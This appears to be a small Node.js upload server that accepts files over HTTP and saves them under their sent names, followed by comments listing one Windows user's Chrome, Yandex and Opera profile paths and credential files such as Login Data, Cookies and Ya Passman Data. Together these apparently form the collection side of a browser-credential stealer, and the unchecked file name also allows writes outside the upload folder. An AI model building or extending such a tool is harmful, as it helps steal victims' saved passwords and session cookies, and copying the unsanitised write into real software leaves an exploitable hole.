'use strict';
const express = require('express');
const busboy = require('connect-busboy');
const fs = require('fs'); 
const server = express();
const port = 8383;

server.use(busboy());
server.route('/upload').post((req, res) => {
        req.pipe(req.busboy);
        req.busboy.on('file', (fieldname, file, filename)=> {
            console.log(`Uploading ${fieldname}: ${filename}`);

            let fstream = fs.createWriteStream(__dirname + '/data/' + filename);
            file.pipe(fstream);
            fstream.on('close', (err)=> {  
                if(err) {
                    console.log(`Upload ${fieldname} of ${filename} failed`);
                    res.sendStatus(400); 
                }
                else {
                    console.log(`Upload ${fieldname} of ${filename} finished`);              
                    res.sendStatus(200); 
                }                  
            });
        });
    });

server.listen(port, ()=>{ console.log("Server is creared on port " + port) });

/* C:\Users\Shon2\AppData\Local\Google\Chrome\User Data\Default
Web Data
Cookies
History
Login Data
*/
/* C:\Users\Shon2\AppData\Local\Yandex\YandexBrowser\User Data\Default
Cookies
History
Web Data
Ya Passman Data
*/
/*C:\Users\Shon2\AppData\Roaming\Opera Software\Opera GX Stable || C:\Users\Shon2\AppData\Roaming\Opera Software\Opera Stable
Web Data
Cookies
History
Login Data
*/